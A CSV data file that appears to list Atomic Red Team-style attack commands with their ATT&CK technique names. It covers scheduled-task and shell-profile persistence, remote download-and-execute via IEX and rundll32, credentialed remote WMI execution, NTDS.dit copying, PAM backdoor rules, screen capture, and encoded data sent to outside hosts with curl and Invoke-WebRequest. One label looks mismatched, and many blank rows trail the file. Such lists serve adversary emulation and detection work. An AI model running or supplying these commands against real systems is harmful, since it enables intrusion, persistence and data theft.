Command,Technique
"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""",Scheduled Task
"schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",Scheduled Task
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST #{time},Scheduled Task
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST 20:10,Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST 20:10",Scheduled Task
"SCHTASKS /Create /S localhost /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU DOMAIN\user /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"$Action = New-ScheduledTaskAction -Execute ""calc.exe""",Scheduled Task
$Trigger = New-ScheduledTaskTrigger -AtLogon,Scheduled Task
"$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest",Scheduled Task
$Set = New-ScheduledTaskSettingsSet,Scheduled Task
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set,Scheduled Task
Register-ScheduledTask AtomicTask -InputObject $object,Scheduled Task
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,Scheduled Task
"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)",Scheduled Task
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""",Scheduled Task
"$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml"")",Scheduled Task
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",Scheduled Task
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f,Scheduled Task
"schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45",Scheduled Task
"$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"")",Scheduled Task
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",Scheduled Task
"$Action = New-ScheduledTaskAction -Execute ""cmd.exe""",Scheduled Task
$Trigger = New-ScheduledTaskTrigger -AtLogon,Scheduled Task
"$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest",Scheduled Task
$Set = New-ScheduledTaskSettingsSet,Scheduled Task
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set,Scheduled Task
Register-ScheduledTask AtomicTaskModifed -InputObject $object,Scheduled Task
"$NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""",Scheduled Task
"Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction",Scheduled Task
"""#{rar_exe}"" a -r #{output_file} %USERPROFILE%\*#{file_extension}",Archive via Utility
"""#{rar_exe}"" a -r #{output_file} #{input_path}\*.txt",Archive via Utility
"""#{rar_exe}"" a -r %USERPROFILE%\T1560.001-data.rar #{input_path}\*#{file_extension}",Archive via Utility
"""#{rar_exe}"" a -r #{output_file} #{input_path}\*#{file_extension}",Archive via Utility
"""%programfiles%/WinRAR/Rar.exe"" a -r #{output_file} #{input_path}\*#{file_extension}",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{rar_exe}"" a -hp""blue"" hello.rar",Archive via Utility
dir,Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar",Archive via Utility
dir,Archive via Utility
"path=%path%;""C:\Program Files (x86)\winzip""",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%ProgramFiles%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip *",Archive via Utility
dir,Archive via Utility
"path=%path%;""C:\Program Files (x86)\winzip""",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{winzip_exe}"" -min -a -s""hello"" archive.zip *",Archive via Utility
dir,Archive via Utility
mkdir $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
cd $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{7zip_exe}"" u archive.7z *txt -pblue",Archive via Utility
dir,Archive via Utility
mkdir $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
cd $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%ProgramFiles%\7-zip\7z.exe"" u archive.7z *txt -pblue",Archive via Utility
dir,Archive via Utility
"zip #{output_file} /var/log/{w,b}tmp",Archive via Utility
zip $HOME/data.zip #{input_files},Archive via Utility
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt),Archive via Utility
test -e #{input_file} && gzip -k #{input_file} || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> #{input_file}; gzip -k #{input_file}),Archive via Utility
tar -cvzf #{output_file} $HOME/$USERNAME,Archive via Utility
tar -cvzf $HOME/data.tar.gz #{input_file_folder},Archive via Utility
mkdir -p /tmp/T1560,Archive via Utility
cd /tmp/T1560; touch a b c d e f g,Archive via Utility
"zip --password ""#{encryption_password}"" /tmp/T1560/#{test_file} ./*",Archive via Utility
"echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/#{test_file}.zip.gpg -c /tmp/T1560/#{test_file}.zip",Archive via Utility
ls -l /tmp/T1560,Archive via Utility
mkdir -p #{test_folder},Archive via Utility
cd #{test_folder}; touch a b c d e f g,Archive via Utility
"zip --password ""#{encryption_password}"" #{test_folder}/T1560 ./*",Archive via Utility
"echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/T1560.zip.gpg -c #{test_folder}/T1560.zip",Archive via Utility
ls -l #{test_folder},Archive via Utility
mkdir -p #{test_folder},Archive via Utility
cd #{test_folder}; touch a b c d e f g,Archive via Utility
"zip --password ""InsertPasswordHere"" #{test_folder}/#{test_file} ./*",Archive via Utility
"echo ""InsertPasswordHere"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip",Archive via Utility
ls -l #{test_folder},Archive via Utility
zip -r  /tmp/t1560/#{input_file}.zip /tmp/t1560,Archive via Utility
openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in /tmp/t1560/#{input_file}.zip -out /tmp/t1560/#{input_file}.enc,Archive via Utility
cat /tmp/t1560/#{input_file}.enc | base64,Archive via Utility
zip -r  #{input_folder}/t1560_data.zip #{input_folder},Archive via Utility
openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/t1560_data.zip -out #{input_folder}/t1560_data.enc,Archive via Utility
cat #{input_folder}/t1560_data.enc | base64,Archive via Utility
zip -r  #{input_folder}/#{input_file}.zip #{input_folder},Archive via Utility
openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc,Archive via Utility
cat #{input_folder}/#{input_file}.enc | base64,Archive via Utility
tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg,Archive via Utility
"& ""C:\Program Files\7-Zip\7z.exe"" a ""#{host.dir.staged}.7z"" ""#{host.dir.staged}\*"" ""-p#{host.archive.password}"" | Out-Null;",Archive via Utility
sleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select,Archive via Utility
wmic useraccount get /ALL /format:csv,Windows Management Instrumentation
"wmic process get caption,executablepath,commandline /format:csv",Windows Management Instrumentation
"wmic qfe get description,installedOn /format:csv",Windows Management Instrumentation
"wmic /node:""127.0.0.1"" service where (caption like ""%#{service_search_string}%"")",Windows Management Instrumentation
"wmic /node:""#{node}"" service where (caption like ""%Spooler%"")",Windows Management Instrumentation
wmic process call create notepad.exe,Windows Management Instrumentation
"wmic /user:#{user_name} /password:#{password} /node:""127.0.0.1"" process call create #{process_to_execute}",Windows Management Instrumentation
"wmic /user:DOMAIN\Administrator /password:#{password} /node:""#{node}"" process call create #{process_to_execute}",Windows Management Instrumentation
"wmic /user:#{user_name} /password:P@ssw0rd1 /node:""#{node}"" process call create #{process_to_execute}",Windows Management Instrumentation
"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create notepad.exe",Windows Management Instrumentation
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA,Windows Management Instrumentation
"$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process""))",Windows Management Instrumentation
"$NewClass = $Class.Derive(""Win32_Atomic"")",Windows Management Instrumentation
$NewClass.Put(),Windows Management Instrumentation
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList #{process_to_execute},Windows Management Instrumentation
"$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process""))",Windows Management Instrumentation
"$NewClass = $Class.Derive(""#{new_class}"")",Windows Management Instrumentation
$NewClass.Put(),Windows Management Instrumentation
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList notepad.exe,Windows Management Instrumentation
"wmic /node:127.0.0.1 process call create ""rundll32.exe #{dll_to_execute} #{function_to_execute}""",Windows Management Instrumentation
"wmic /node:#{node} process call create ""rundll32.exe PathToAtomicsFolder\..\ExternalPayloads\calc.dll #{function_to_execute}""",Windows Management Instrumentation
"wmic /node:#{node} process call create ""rundll32.exe #{dll_to_execute} StartW""",Windows Management Instrumentation
"wmic /node:""127.0.0.1"" product where ""name like '#{product}%%'"" call uninstall",Windows Management Instrumentation
"wmic /node:""#{node}"" product where ""name like 'Tightvnc%%'"" call uninstall",Windows Management Instrumentation
"wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;",Windows Management Instrumentation
cat $env:APPDATA\vmtools.log,Windows Management Instrumentation
wmic.exe /NODE:*process call create*,Windows Management Instrumentation
wmic.exe /NODE:*path AntiVirusProduct get*,Windows Management Instrumentation
wmic.exe /NODE:*path FirewallProduct get*,Windows Management Instrumentation
WmiPrvSE.exe,Windows Management Instrumentation
"wmic.exe /NODE: ""192.168.0.1"" process call create ""*.exe""",Windows Management Instrumentation
"wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""at 9:00PM <path> ^> <path>""",Windows Management Instrumentation
"wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit""",Windows Management Instrumentation
powershell/lateral_movement/invoke_wmi,Windows Management Instrumentation
powershell/persistence/elevated/wmi,Windows Management Instrumentation
"echo ""#{command_to_add}"" >> ~/.bashrc",Malicious Shell Modification
"echo ""#{command_to_add}"" >> ~/.bash_profile",Malicious Shell Modification
"echo ""/home/ec2-user/welcome.sh"" >>~/.bash_profile",Malicious Shell Modification
"echo ""/home/ec2-user/welcome.sh"" >>~/.bashrc",Malicious Shell Modification
screencapture /tmp/T1113_desktop.png,Screen Capture
screencapture -x /tmp/T1113_desktop.png,Screen Capture
xwd -root -out /tmp/T1113_desktop.xwd,Screen Capture
xwud -in /tmp/T1113_desktop.xwd,Screen Capture
xwd -root -out #{output_file},Screen Capture
xwud -in #{output_file},Screen Capture
import -window root /tmp/T1113_desktop.png,Screen Capture
cmd /c start /b psr.exe /start /output c:\temp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12,Screen Capture
"Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;",Screen Capture
"[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);",Screen Capture
"cmd /c ""timeout #{recording_time} > NULL && psr.exe /stop""",Screen Capture
Add-Type -AssemblyName System.Windows.Forms,Screen Capture
$screen = [Windows.Forms.SystemInformation]::VirtualScreen,Screen Capture
"$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height",Screen Capture
$graphic = [Drawing.Graphics]::FromImage($bitmap),Screen Capture
"$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)",Screen Capture
"$bitmap.Save(""$env:TEMP\T1113.png"")",Screen Capture
"for i in {1..5}; do screencapture -t png screen-$i.png; echo ""$(cd ""$(dirname ""$1"")""; pwd -P)/$(basename ""screen-$i.png"")""; sleep 5; done;",Screen Capture
"$loadResult = [Reflection.Assembly]::LoadWithPartialName(""System.Drawing"");
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
   $graphics = [Drawing.Graphics]::FromImage($bmp);
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
   $bmp.Save($path);
   $graphics.Dispose();
   $bmp.Dispose();
}
if ($loadResult) {
  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
  $dest = ""$HOME\Desktop\screenshot.png"";
  screenshot $bounds $dest;
  if (Test-Path -Path $dest) {
    $dest;
    exit 0;
  };
};
exit 1;
",Screen Capture
powershell/collection/screenshot,Screen Capture
python/collection/osx/native_screenshot,Screen Capture
python/collection/osx/native_screenshot_mss,Screen Capture
python/collection/osx/screenshot,Screen Capture
\Environment\UserInitMprLogonScript,Boot or Logon Initialization Scripts
python/persistence/multi/desktopfile,Boot or Logon Initialization Scripts
python/persistence/osx/loginhook,Boot or Logon Initialization Scripts
whoami /all /fo list,System Owner/User Discovery
shell whoami /all /fo list,System Owner/User Discovery
getuid,System Owner/User Discovery
cmd.exe /C whoami,System Owner/User Discovery
wmic useraccount get /ALL,System Owner/User Discovery
"quser /SERVER:""localhost""",System Owner/User Discovery
quser,System Owner/User Discovery
qwinsta.exe /server:localhost,System Owner/User Discovery
qwinsta.exe,System Owner/User Discovery
"for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt",System Owner/User Discovery
"@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",System Owner/User Discovery
users,System Owner/User Discovery
w,System Owner/User Discovery
who,System Owner/User Discovery
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,System Owner/User Discovery
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose,System Owner/User Discovery
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt,System Owner/User Discovery
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append,System Owner/User Discovery
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,System Owner/User Discovery
$TokenSet = @{,System Owner/User Discovery
U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ',System Owner/User Discovery
N = [Char[]]'0123456789',System Owner/User Discovery
},System Owner/User Discovery
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U,System Owner/User Discovery
$Number = Get-Random -Count 5 -InputObject $TokenSet.N,System Owner/User Discovery
$StringSet = $Upper + $Number,System Owner/User Discovery
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join '',System Owner/User Discovery
"$file = ""rad"" + $rad + "".tmp""",System Owner/User Discovery
whoami.exe /all >> $env:temp\$file,System Owner/User Discovery
powershell/situational_awareness/network/bloodhound,System Owner/User Discovery
powershell/situational_awareness/network/powerview/get_loggedon,System Owner/User Discovery
powershell/situational_awareness/network/powerview/get_session,System Owner/User Discovery
python/collection/osx/pillage_user,System Owner/User Discovery
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();",Rundll32
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",Rundll32
"rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",Rundll32
"rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,",Rundll32
"rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,",Rundll32
"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf",Rundll32
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf",Rundll32
"rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta",Rundll32
"rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs",Rundll32
"rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe",Rundll32
"rundll32.exe #{input_file}, StartW",Rundll32
"rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW",Rundll32
"rundll32.exe #{input_file},#2",Rundll32
"rundll32.exe PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll,#2",Rundll32
"rundll32.exe shell32.dll,Control_RunDLL #{input_file}",Rundll32
"rundll32.exe shell32.dll,Control_RunDLL PathToAtomicsFolder\T1047\bin\calc.dll",Rundll32
copy %windir%\System32\calc.exe not_an_scr.scr,Rundll32
"rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr",Rundll32
docker build -t t1613  $PathtoAtomicsFolder/T1613/src/,Container and Resource Discovery
docker run --name t1613_container  -d -t t1613,Container and Resource Discovery
docker ps,Container and Resource Discovery
docker stats --no-stream,Container and Resource Discovery
docker inspect $(docker ps -l -q --filter ancestor=t1613),Container and Resource Discovery
echo -n 111-11-1111 | base64,Standard Encoding
curl -XPOST #{base64_data}.redcanary.com,Standard Encoding
echo -n 111-11-1111 | base64,Standard Encoding
curl -XPOST MTExLTExLTExMTE=.#{destination_url},Standard Encoding
"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""#{plaintext}""))",Standard Encoding
"$key = ""#{key}""",Standard Encoding
$cyphertext =  @();,Standard Encoding
for ($i = 0; $i -lt $plaintext.Count; $i++) {,Standard Encoding
$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];,Standard Encoding
},Standard Encoding
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext),Standard Encoding
[System.Net.ServicePointManager]::Expect100Continue = $false,Standard Encoding
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive,Standard Encoding
"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim""))",Standard Encoding
"$key = ""#{key}""",Standard Encoding
$cyphertext =  @();,Standard Encoding
for ($i = 0; $i -lt $plaintext.Count; $i++) {,Standard Encoding
$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];,Standard Encoding
},Standard Encoding
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext),Standard Encoding
[System.Net.ServicePointManager]::Expect100Continue = $false,Standard Encoding
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive,Standard Encoding
"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""#{plaintext}""))",Standard Encoding
"$key = ""abcdefghijklmnopqrstuvwxyz123456""",Standard Encoding
$cyphertext =  @();,Standard Encoding
for ($i = 0; $i -lt $plaintext.Count; $i++) {,Standard Encoding
$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];,Standard Encoding
},Standard Encoding
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext),Standard Encoding
[System.Net.ServicePointManager]::Expect100Continue = $false,Standard Encoding
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive,Standard Encoding
"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" /etc/pam.d/su-l",Pluggable Authentication Modules
"sudo sed -i ""#{index}s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" #{path_to_pam_conf}",Pluggable Authentication Modules
"sudo sed -i ""#{index}s,^,auth sufficient /tmp/pam_evil.so\n,g"" #{path_to_pam_conf}",Pluggable Authentication Modules
"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}",Pluggable Authentication Modules
bash sudo spctl --master-disable,HISTCONTROL
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
